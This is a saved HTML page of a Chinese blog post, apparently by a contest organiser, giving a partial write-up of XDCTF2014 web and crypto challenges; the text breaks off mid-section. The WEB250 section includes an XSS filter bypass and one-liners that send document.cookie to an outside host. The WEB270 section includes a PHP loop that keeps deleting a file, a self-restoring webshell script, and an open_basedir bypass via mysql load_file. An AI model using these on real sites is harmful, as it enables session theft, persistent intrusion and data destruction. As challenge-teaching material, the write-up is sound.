@@ -1,0 +1,768 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./XDCTF2014 部分Writeup  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./XDCTF2014 部分Writeup  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./XDCTF2014 部分Writeup  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>XDCTF2014 部分Writeup | 离别歌</title>
+<link href="./XDCTF2014 部分Writeup  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./XDCTF2014 部分Writeup  离别歌/styles.css" rel="stylesheet"/>
+<link href="./XDCTF2014 部分Writeup  离别歌/style.css" rel="stylesheet"/>
+<link href="./XDCTF2014 部分Writeup  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./XDCTF2014 部分Writeup  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./XDCTF2014 部分Writeup  离别歌/jquery.min.js"></script>
+<link href="./XDCTF2014 部分Writeup  离别歌/code.css" rel="stylesheet"/>
+<link href="./XDCTF2014 部分Writeup  离别歌/button.css" rel="stylesheet"/>
+<link href="./XDCTF2014 部分Writeup  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./XDCTF2014 部分Writeup  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/XDCTF-2014-Writeup.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/XDCTF-2014-Writeup.html&amp;text=XDCTF2014%20%E9%83%A8%E5%88%86Writeup"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/XDCTF-2014-Writeup.html&amp;title=XDCTF2014%20%E9%83%A8%E5%88%86Writeup"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/XDCTF-2014-Writeup.html&amp;is_video=false&amp;description=XDCTF2014%20%E9%83%A8%E5%88%86Writeup"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=XDCTF2014%20%E9%83%A8%E5%88%86Writeup&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/XDCTF-2014-Writeup.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/XDCTF-2014-Writeup.html&amp;title=XDCTF2014%20%E9%83%A8%E5%88%86Writeup"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/XDCTF-2014-Writeup.html&amp;title=XDCTF2014%20%E9%83%A8%E5%88%86Writeup"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/XDCTF-2014-Writeup.html&amp;title=XDCTF2014%20%E9%83%A8%E5%88%86Writeup"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/XDCTF-2014-Writeup.html&amp;title=XDCTF2014%20%E9%83%A8%E5%88%86Writeup"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/XDCTF-2014-Writeup.html&amp;name=XDCTF2014%20%E9%83%A8%E5%88%86Writeup&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">XDCTF2014 部分Writeup</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年10月5日 01:43" itemprop="datePublished">
+                    2014 十月 05 01:43
+                </time>
+</div>
+<div class="article-tag">
+            阅读：8158
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/XDCTF">XDCTF</a>,
+                
+                <a class="tag-link" href="/tag/writeup">writeup</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p class="p0" style="text-indent:21.0000pt;">
+	首先我代表我们<span>XDCTF</span><span>主办方对大家说声辛苦了，十一假期本该休息却依旧奋斗在</span><span>CTF</span><span>第一线。我是</span><span>XDCTF2014</span><span>的出题人之一，也是服务器的维护者之一，关于比赛不想说太多，有太多不可控制的因素。包括中途停电之类的事情，也备受吐槽。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	这份<span>writeup</span><span>是几道</span><span>web</span><span>题目和一个加密解密的题目，我知识面比较窄，所以题目和</span><span>writeup</span><span>都不能面面俱到，有一些想法在心里却最后没能放出来，所以这里也就不提了。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	 
+</p>
+<p class="p0">
+<strong>WEB20</strong>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	 
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	“
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	什么，小<span>P</span><span>说来点彩头？先出个简单的，就</span><span>WEB20</span><span>吧。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	题目链接： <span>WEB20</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	 
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	hint &gt; <span>大家不知道复活节要玩什么吗？（非前端题，请勿关注</span><span>html</span><span>注释、</span><span>css</span><span>、</span><span>javascript</span><span>等）</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	”
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	 
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	WEB20<span>是我很久以前就出好的一个题目，今年比赛特别多，不过一直没有被人家用上，所以就当个彩头送出来了，没想到还难倒了一批人。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	考点是<span>php</span><span>彩蛋。只要运行</span><span>PHP</span><span>的服务器上，访问任何网页都可以在</span><span>URL</span><span>后添加以下字符串来查看信息</span><span>:</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	 
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 (PHP<span>信息列表</span><span>)</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	?=PHPE9568F34-D428-11d2-A769-00AA001ACF42 (PHP<span>的</span><span>LOGO)</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	?=PHPE9568F35-D428-11d2-A769-00AA001ACF42 (Zend LOGO)
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 (PHP LOGO <span>蓝色大象</span><span>)</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	 
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	基本很多<span>php</span><span>网站都存在彩蛋，比如乌云：</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<a href="https://www.leavesongs.com/content/uploadfile/201410/4efd1412444865.jpg" id="ematt:600" target="_blank"><img alt="01.jpg" border="0" height="367" src="./XDCTF2014 部分Writeup  离别歌/thum-4efd1412444865.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	所以我们可以通过在网站域名后面加“彩蛋”来判断一个网站是否是由<span>php</span><span>编写的。是否显示</span><span>php</span><span>彩蛋是通过</span><span>php.ini</span><span>中</span><span>expose_php</span><span>来控制的，设置为</span><span>Off</span><span>则不会显示了。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	 
+</p>
+<p class="p0">
+<strong>WEB200</strong>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	 
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	“
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	自从小<span>P</span><span>告诉离休老干部</span><span>le4f python</span><span>怎么写网站以后，就一发不可收拾。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	这是<span>le4f</span><span>的新作：</span><span>http://y0pk678.xdctf.com:8081/</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	说明：本题<span>flag</span><span>形式为</span><span>XDCTF{XXXX}</span><span>，填入</span><span>XXXX</span><span>内容即可。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	”
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	 
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	这题是冷夜出的一道题，分给的高了，是我的错。
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	一个<span>web.py</span><span>写的简单</span><span>web</span><span>应用，访问首页发现一具话“</span><span>u may need help information.</span><span>”，于是访问</span><span>http://y0pk678.xdctf.com:8081/help</span><span>，查看源码发现一个超链接：</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<a href="https://www.leavesongs.com/content/uploadfile/201410/3fb51412444875.jpg" id="ematt:602" target="_blank"><img alt="02.jpg" border="0" height="146" src="./XDCTF2014 部分Writeup  离别歌/thum-3fb51412444875.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	由超链接样子可以猜到是一个文件读取，访问之，发现应该是一个说明：
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<a href="https://www.leavesongs.com/content/uploadfile/201410/f9961412444880.jpg" id="ematt:604" target="_blank"><img alt="03.jpg" border="0" height="148" src="./XDCTF2014 部分Writeup  离别歌/f9961412444880.jpg" title="点击查看原图" width="504"/></a>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	而且每次刷新出来的内容不一样。每次出来两行，可能是随机显示的。既然这里说了是<span>newapp.py</span><span>，那就把</span><span>file=readme</span><span>换成</span><span>file=newapp.py</span><span>看看：</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<a href="https://www.leavesongs.com/content/uploadfile/201410/2de41412444882.jpg" id="ematt:605" target="_blank"><img alt="04.jpg" border="0" height="167" src="./XDCTF2014 部分Writeup  离别歌/2de41412444882.jpg" title="点击查看原图" width="501"/></a>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	很明显是一个<span>python</span><span>文件，但每次访问只显示两行。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	于是自己写个简单的爬虫或用<span>burpsuite</span><span>将所有行读取出来，得到</span><span>newapp.py</span><span>的内容：</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<a href="https://www.leavesongs.com/content/uploadfile/201410/13501412444883.jpg" id="ematt:606" target="_blank"><img alt="05.jpg" border="0" height="407" src="./XDCTF2014 部分Writeup  离别歌/thum-13501412444883.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	如图，关键代码已圈出。在<span>xdctf</span><span>函数中（通过前面的路由规则可知访问</span><span>/getflag</span><span>会转到</span><span>xdctf</span><span>函数），如果</span><span>web.input()[</span>‘unabletoread’] == ‘le4f.net’，则读到一个什么文件，把内容通过<span>header</span><span>发给我。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	于是就访问<span>http://y0pk678.xdctf.com:8081/getflag?unabletoread=le4f.net </span><span>即可以在数据包中找到</span><span>flag</span><span>：</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<a href="https://www.leavesongs.com/content/uploadfile/201410/fac41412444886.jpg" id="ematt:608" target="_blank"><img alt="06.jpg" border="0" height="569" src="./XDCTF2014 部分Writeup  离别歌/thum-fac41412444886.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	 
+</p>
+<p class="p0">
+<strong>WEB250</strong>
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	一个存在<span>XSS</span><span>的留言板。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	注册登录以后会有这样的提示：使用如下方式让留言更漂亮：
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	[a]http://<span>超链接</span><span>[/a]</span><span>、</span><span>[b]</span><span>粗体</span><span>[/b]</span><span>、</span><span>[pre]</span><span>代码</span><span>[/pre]</span><span>、</span><span>[i]</span><span>斜体</span><span>[/i]</span><span>等，不允许引用图片。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	随便<span>fuzz</span><span>测试一下发现很多特殊符号被过滤了，包括</span><span>&lt;</span><span>、</span><span>&gt;</span><span>、</span>”、<span>=</span><span>、</span><span>(</span><span>、</span><span>)</span><span>等，但后面会把</span><span>[</span><span>、</span><span>]</span><span>转换成</span><span>&lt;</span><span>、</span><span>&gt;</span><span>，也就是说我们可以引入</span><span>html</span><span>标签。但问题是</span><span>=</span><span>没有了，</span><span>&lt;img src=1 onerror=xxx&gt;</span><span>用不了</span><span>(</span><span>没等号</span><span>)</span><span>，</span><span>javascript</span><span>也各种用不了。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	所以这里需要用到的知识是<span>&lt;svg&gt;</span><span>，在</span><span>&lt;svg&gt;</span><span>中的</span><span>&lt;script&gt;</span><span>代码可以用</span><span>html</span><span>实体代替。比如</span><span>&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><span>可以换成“</span><span>&lt;svg&gt;&lt;script&gt;&amp;# 97;&amp;# 108;&amp;# 101;&amp;# 114;&amp;# 116;&amp;# 40;&amp;# 49;&amp;# 41;&lt;/script&gt;</span><span>”，不过</span><span>html</span><span>实体的分号不能丢，这跟</span><span>html</span><span>属性中实体的分号可以省略不同。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	所以这里输入<span>[svg][script]&amp;# 97;&amp;# 108;&amp;# 101;&amp;# 114;&amp;# 116;&amp;# 40;&amp;# 49;&amp;# 41;[/script]</span><span>即可弹窗（去掉&amp;#和数字间的空格）：</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<a href="https://www.leavesongs.com/content/uploadfile/201410/e4bd1412444887.jpg" id="ematt:610" target="_blank"><img alt="07.jpg" border="0" height="446" src="./XDCTF2014 部分Writeup  离别歌/e4bd1412444887.jpg" title="点击查看原图" width="299"/></a>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<a href="https://www.leavesongs.com/content/uploadfile/201410/86c31412444891.jpg" id="ematt:611" target="_blank"><img alt="08.jpg" border="0" height="403" src="./XDCTF2014 部分Writeup  离别歌/thum-86c31412444891.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	弹窗后有的同学就直接<span>document.write(</span>‘&lt;script src=xxx&gt;&lt;/script&gt;’)<span>开始了，这样肯定是不行的，因为我加了个小小的坑，做了</span><span>csp</span><span>限制，当然不是让你绕过</span><span>csp</span><span>，因为我并没有限制内联脚本执行。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	所以直接利用<span>xss</span><span>平台来加载远程</span><span>js</span><span>，执行代码是不现实了（</span><span>csp</span><span>里限制了加载外部资源），也不能通过常规的</span><span>new Image().src</span><span>来传递</span><span>cookie</span><span>了。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	换个方式即可，
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	location.href=”http://xss.com/?cookie=”+escape(document.cookie)<span>，</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	或者
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	var a=document.createElement("a");a.href='http://xss.com/?cookie='+escape(document.cookie);a.click();
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	都可以。让页面跳转到你的<span>xss</span><span>平台并将</span><span>cookie</span><span>带在参数中即可。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	这道<span>XSS</span><span>题还有另一个思路，注册的时候的用户名写成</span><span>javascript</span><span>代码，如“</span><span>*/alert(1);/*</span><span>”，然后发表两条留言，</span><span>[/script]</span><span>和</span><span>[script]</span><span>，这样就能拼接而成一个完整的</span><span>payload</span><span>。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	 
+</p>
+<p class="p0">
+<strong>CRACK180</strong>
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0">
+	“
+</p>
+<p class="p0">
+	  ZZ<span>发现土豪</span><span>Ph</span><span>在用</span><span>SafeAccountSystem</span><span>给</span><span>Le4f</span><span>打一笔退休金</span><span>$23333</span><span>，</span><span>ZZ</span><span>截断了支付过程的密文，打算捉弄一下他们把退休金打到自己账户</span><span>Z2333</span><span>上。</span>
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0">
+	密文点此处下载<span>: http://game1.xdctf.com:8081/Z4l2Lu7XkNBa/crypt.txt</span>
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0">
+	支付系统的地址 <span>game1.xdctf.com   </span><span>端口，</span><span>50008</span><span>，请用</span><span>nc</span><span>连接（</span><span>telnet</span><span>不行）</span>
+</p>
+<p class="p0">
+	本题考点加密与解密，可是没这个分类，真拙计。
+</p>
+<p class="p0">
+	本题<span>flag</span><span>形如</span><span>xdctf{xxx}</span><span>，答案填入</span><span>xxx</span><span>即可。</span>
+</p>
+<p class="p0">
+	”
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0">
+	下载劫持到的支付密文，可以看出混有培根密码，将其中的培根转换为正常字符，
+</p>
+<p class="p0">
+	595270AABAA5853AAAAB133AABAA07AAAABAAABBAAAAB5AAABB7AABAB827AAABB0AAABBAABAB6AAAAA910AAABBAABAA23289280801AABABAAAAAAABAAAABABAAABBAAABB4078AABAA56AABABAAAAB8AAABA2AAAAB5AAABA881AABAB2AAAAB7AABAB58AAAAA096AAAAA367AAAAA32AAAABAABAA33AAABB7248989AAABB6AAAAB2319AABAB091AABABAABAB4AAAAA12AABABAABAB2AAAAA4717AAABB4AAABA01AAAAB242927AAAABAABAA0643AABAB06AABABAAAABAABAA29AAAAB10AAAAAAABAA
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0">
+	解密后：
+</p>
+<p class="p0">
+	595270e5853b133e07bdb5d7f827d0df6a910de23289280801faefdd4078e56fb8c2b5c881f2b7f58a096a367a32be33d7248989d6b2319f091ff4a12ff2a4717d4c01b242927be0643f06fbe29b10ae
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0">
+	登陆题目系统，建立账户测试，比如建立账户<span>Alice</span><span>和</span><span>Bob</span><span>，然后选择支付模式</span><span>1</span><span>，支付数额</span><span>100</span><span>，然后系统提示余额不足，支付失败。</span>
+</p>
+<p class="p0">
+	改变支付数额，比如改为<span>200</span><span>，其他信息不变，可以发现密文中只有一段密文变化，由此可猜测密文是分组加密，提取劫持到的密文中的这一部分。</span><span> </span>
+</p>
+<p class="p0">
+	继续改变收款人和支付人的姓名进行测试，可以确定收款人和支付人在密文中的位置。确定之后，改变支付方式，确定<span>Ph</span><span>使用的支付方式为第三种。并且发现</span><span>One-time-password</span><span>并不是一次性的。</span>
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0">
+	最后确定密文格式如下
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0">
+	收款人<span>+</span><span>支付方式</span><span>+One-Time-Password+</span><span>支付人</span><span>+</span><span>支付数额</span>
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0">
+	提取其中的<span>OneTimePassword</span><span>，为</span><span>b8c2b5c881f2b7f58a096a367a32be33</span>
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0">
+	根据系统流程，<span>sender</span><span>输入</span><span>Ph</span><span>，正确输入</span><span>OneTimePassword</span><span>，</span><span>Receiver</span><span>输入</span><span>Z2333</span><span>，支付方式选择</span><span>3</span><span>，数额为</span><span>23333</span><span>即可弹出</span><span>flag  xdctf{d4d5906bb2f30b3bbbc1d915e6ba0f7321}</span>
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	 
+</p>
+<p class="p0">
+<strong>WEB270</strong>
+</p>
+<p class="p0">
+	 
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	“
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	小<span>P</span><span>睡了一觉起来，发现黑客们都饥渴难耐，想日站想疯了。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	小<span>P</span><span>默默地看了看自己的网站：</span><span>http://ph.xdctf.com:8082/ </span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	感觉不知道放个什么程序比较好，而同服的另一个网站居然已经运营很久了：<span>http://hlecgsp1.xdctf.com:8082/</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	真不知道该怎么办……
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	 
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	ps.
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	这是一个系列题目，分步骤给分。一共<span>4</span><span>个</span><span>FLAG</span><span>都在小</span><span>P</span><span>网站所在的服务器中。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	请黑客们不要破坏网站文件、数据库。一旦发现有阻碍比赛正常进行的现象，将会恢复服务器到最初状态。
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	说明：<span>4</span><span>个</span><span>flag</span><span>都形如</span><span>flag-xxxx</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	”
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<br>
+</br></p>
+<p class="p0" style="text-indent:21.0000pt;">
+	这题考点是<span>cms</span><span>渗透实战</span><span>+open_basedir</span><span>绕过。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	一共四个<span>flag</span><span>，实际上除了第三个，都比较好拿。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	首先来到<span>phpok</span><span>，</span><span>http://wooyun.org/bugs/wooyun-2010-064360</span><span>这里有一个现成的注入，构造一下获得管理员密码：</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<a href="https://www.leavesongs.com/content/uploadfile/201410/10581412444896.jpg" id="ematt:613" target="_blank"><img alt="09.jpg" border="0" height="184" src="./XDCTF2014 部分Writeup  离别歌/thum-10581412444896.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	解密得到密码为<span>198712</span><span>，进入后台。在</span><span>smtp</span><span>密码处得到一个</span><span>flag</span><span>。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	后台编辑风格处将模板后缀名改为<span>php</span><span>：</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<a href="https://www.leavesongs.com/content/uploadfile/201410/ae561412444899.jpg" id="ematt:615" target="_blank"><img alt="10.jpg" border="0" height="475" src="./XDCTF2014 部分Writeup  离别歌/thum-ae561412444899.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	然后编辑模板，添加一个<span>php</span><span>文件，写入</span><span>shell</span><span>即可。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<a href="https://www.leavesongs.com/content/uploadfile/201410/bd221412444901.jpg" id="ematt:617" target="_blank"><img alt="0011.jpg" border="0" height="244" src="./XDCTF2014 部分Writeup  离别歌/bd221412444901.jpg" title="点击查看原图" width="486"/></a>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<br>
+</br></p>
+<p class="p0" style="text-indent:21.0000pt;">
+	在网站根目录下文件中找到第二个<span>flag</span><span>。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	关于<span>GETSHELL</span><span>这部分，有同学在比赛期间和我反应，说有人删</span><span>shell</span><span>，这是所有</span><span>ctf</span><span>里都无法避免的。下面是我曾经用过的一个猥琐脚本： </span>
+</p>
+<pre class="brush: php;auto-links: false;">&lt;?php
+ignore_user_abort(true);
+set_time_limit(0);
+$file = isset($_GET['file']) ? $_GET['file'] : 'test.txt';
+ 
+while (TRUE) {
+if (file_exists($file)) {
+@unlink($file);
+}
+usleep(50);
+}
+?&gt;</pre>
+<p>
+<br/>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	让代码进驻在内存中，循环删除某个文件。当然，同样也可以变成某个目录的所有文件。
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	既然无法避免，那么为何我们不能与选择与之抗衡呢？比如我们再来一个“防删脚本”：
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<br/>
+</p>
+<pre class="brush: php;auto-links: false;">&lt;?php
+ignore_user_abort(true);
+set_time_limit(0);
+$file = __FILE__; // or xxx.php
+$shell = isset($_GET['shell']) ? $_GET['shell'] : file_get_contents($file);
+ 
+while (TRUE) {
+if (!file_exists($file)) {
+file_put_contents($file, $shell);
+}
+usleep(50);
+}
+?&gt;</pre>
+<p>
+<br/>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	让代码进驻在内存中，循环判断。一旦发现自己的文件被删除了，就重新写入。
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	当然，后来我把<span>unlink</span><span>禁用了，不过其实是无法阻止删</span><span>shell</span><span>现象的，因为就算不能删除，也可以把文件覆盖掉，只要让你没法连接即可。而且，写文件的函数是没法禁用的，否则影响比赛的正常进行。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	再者，有些同学拿到<span>webshell</span><span>了以后一看到服务器是</span><span>linux</span><span>并且版本很高（</span><span>3.2</span><span>），就无处下手了。假如没有其他人提示说去绕过</span><span>open_basedir</span><span>，最终又有多少人能做出这道题，因为我观察过，</span><span>web270-3</span><span>出来很久也没有人做出来，已经有人说坑了，但当第一个人做出来以后基本人数就是直线上升。我不恶意揣测存在交换</span><span>key</span><span>的现象，但一定存在做出来的人给没做出来的提示，或询问做题思路的现象。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	第三、四个<span>flag</span><span>在同服的另一个网站中，但因为</span><span>php</span><span>设置了</span><span>open_basedir</span><span>，所以似乎无法跨目录读取文件什么的。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	绕过<span>open_basedir</span><span>有几个思路：</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	1.mysql<span>账户如果有</span><span>file_priv</span><span>权限，则可以通过</span><span>mysql load_file</span><span>来跨目录读文件。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	2.利用一些<span>php</span><span>漏洞绕过</span><span>open_basedir</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	3.Php<span>如果能执行命令，则直接通过命令行访问</span><span>open_basedir</span><span>以外的目录即可。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	4.提权
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	第<span>3</span><span>、</span><span>4</span><span>个在本题中不现实，因为能执行命令的函数都被禁用了。而我特地给</span><span>mysql</span><span>账户</span><span>phpok</span><span>给予了</span><span>file_priv</span><span>权限，所以可以通过</span><span>mysql load_file</span><span>读取</span><span>/home/wwwroot/ph/config.php</span><span>中的</span><span>flag</span><span>，得到第四个</span><span>flag</span><span>。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
